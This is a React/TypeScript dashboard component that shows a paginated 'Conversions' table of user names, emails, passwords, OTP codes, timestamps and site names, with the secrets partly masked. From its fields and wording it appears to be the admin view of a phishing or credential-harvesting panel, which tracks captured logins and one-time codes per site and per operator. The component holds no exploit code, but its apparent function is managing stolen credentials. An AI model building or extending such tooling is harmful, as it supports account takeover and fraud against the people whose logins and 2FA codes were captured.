
import { formatUtcToLocal } from "../../utils/DateFormater";
import useInformation from "../../hooks/useInformation";
import { PaginationNav1Presentation } from "../Pagination/Pagination";


const ConversionTable = () => {
  const {displayInfo,totalPages,setPage,page}= useInformation({route:'/overview'})

  return (
    <div className="rounded-sm border  border-stroke bg-white px-5 pt-6 pb-2.5 shadow-default dark:border-strokedark dark:bg-boxdark sm:px-7.5 xl:pb-1">
      <h4 className="mb-6 text-xl font-semibold text-black dark:text-white">
        Conversions
      </h4>

{/* for table */}

<div className="relative overflow-x-auto shadow-md sm:rounded-lg">
  <table className="w-full text-sm text-left rtl:text-right text-gray-500 dark:text-gray-400">
    <thead className="text-xs text-center text-gray-700 uppercase bg-gray-50 dark:bg-gray-700 dark:text-gray-400">
      <tr>
        <th scope="col" className="px-6 py-3">
          ID
        </th>
        <th scope="col" className="px-6 py-3">
          User Name
        </th>
        <th scope="col" className="px-6 py-3">
          Email
        </th>
        <th scope="col" className="px-6 py-3">
          Password
        </th>
        <th scope="col" className="px-6 py-3">
          OTP Code
        </th>

        <th scope="col" className="px-6 py-3">
          Time
        </th>
        <th scope="col" className="px-6 py-3">
          Site
        </th>
 
      </tr>
    </thead>
    <tbody className='text-center'>

      {
        displayInfo?.map(({ user:{name}, updatedAt, email, password,  otp, siteName},index)=>(
          <tr key={index} className="odd:bg-stroke odd:dark:bg-black even:bg-transparent even:dark:bg-transparent border-t dark:border-gray-700">
          <th scope="row" className="px-6 py-4 font-medium text-gray-900 whitespace-nowrap dark:text-white">
           {index + 1}
          </th>
          <td className="px-6 py-4   font-bold ">
      
          <span className={`text-bodydark1 rounded-md p-1 font-bold ${
            index % 2 === 0 ? 'bg-primary' : 'bg-[#2CB13C]'
          }`}>    {name}</span>
          </td>
          <td className="px-6 py-4">
          
          {email &&(email as string)?.split('').slice(0, 2).join('') + '*****.com'}
          </td>
          <td className="px-6 py-4">
          {password && (password as string)?.split('').slice(0, 2).join('') + '*****'}
          </td>
          <td className="px-6 py-4">
          {otp && (otp as string)?.split('').slice(0, 2).join('') + '*****'}
          </td>
  
  
          <td className="px-6 py-4">
          {formatUtcToLocal(updatedAt)}
          </td>
   
          <td className="px-2 py-1 font-bold cursor-pointer  "><span className={`text-bodydark1 rounded-md p-1 font-bold ${
            index % 2 === 0 ? 'bg-primary' : 'bg-[#2CB13C]'
          }`}>  {siteName}</span></td>
         
      
         
  
        </tr>
        ))
      }

   
     




    </tbody>
  </table>
  <div className="flex items-center justify-center">
<PaginationNav1Presentation 
pageCount={totalPages}
pageIndex={page}
setPageIndex={setPage}
  />
</div>
</div>



    </div>
  );
};

export default ConversionTable;
